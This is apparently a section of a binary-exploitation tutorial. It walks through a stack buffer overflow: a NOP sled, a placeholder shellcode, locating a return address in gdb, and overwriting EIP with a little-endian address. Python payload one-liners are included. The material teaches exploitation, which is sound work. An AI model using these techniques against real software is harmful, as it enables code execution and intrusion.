# The Return Address
Once we have found all the bad characters that must be excluded, we can start thinking about our final payload. What do we need? How can the program execute it? To answer these questions, we must know what NOPs are:

## NOP:

NOP, or “no operation,” is a computer instruction that does nothing; it performs no function and does not alter the state of registers, flags, or memory. NOPs are used as placeholders for future code, to create deliberate time delays, to synchronize operations, to pad code for alignment, to prevent pipeline hazards, and in security exploits.

We will using basics NOPS but keep in mind that also the **polymorphic NOPS** exists, feel free to research about them.

## Finding the right address:
- First, we must modify the previous payload to get an idea of where our shellcode will be located in memory:
```
offset = 267                  # The known amount of bytes to reach EIP
nops = b'\x90' * 100          # The amount of NOPS we want to use in this case
tmp_shellcode = b'\x33' * 150         # A test shellcode just to locate the space of it on the memory
padding = b'E' * (offset  - len(nops) - len(tmp_shellcode))      # The amount of padding we will use
eip = b'k' * 4                # EIP test value
    
payload = padding + nops + tmp_shellcode + eip   
```

- Now let us apply the changes:

```bash
run $(python3 -c "import sys; offset = 267; nops = b'\x90' * 100; tmp_shellcode = b'\x33' * 100; padding = b'E' * (offset - len(nops) - len(tmp_shellcode)); eip = b'k' * 4; payload = padding + nops + tmp_shellcode + eip; sys.stdout.buffer.write(payload)")
```

<img width="1274" height="84" alt="1" src="https://github.com/user-attachments/assets/fe769006-855b-4203-b38a-e9cca1a57cf1" />


Now, once we reach our previous breakpoint (or the program crashes), we can examine the program’s memory to look for a return address using ```x/400xb $esp``` (Adjust depending on your case)

<img width="783" height="676" alt="2" src="https://github.com/user-attachments/assets/08763347-098f-4ca1-8ec2-c228a92cd235" />


As can be seen, the NOPs start at 0xffffd0b0. The idea is to use the return address as the new value for EIP register to redirect the program to where our NOPS are in memory, causing the CPU slides into our shellcode and executing it. 


In this case we choose 0xffffd0c0 as the new value. The address must be written in our payload using little endian format:
```
b'\xc0\xd0\xff\xff'  # New EIP value
```
## Updated test payload:
```
run $(python3 -c "import sys; offset = 267; nops = b'\x90' * 100; tmp_shellcode = b'\x33' * 100; padding = b'E' * (offset - len(nops) - len(tmp_shellcode)); eip = b'\xc0\xd0\xff\xff'; payload = padding + nops + tmp_shellcode + eip; sys.stdout.buffer.write(payload)")
```



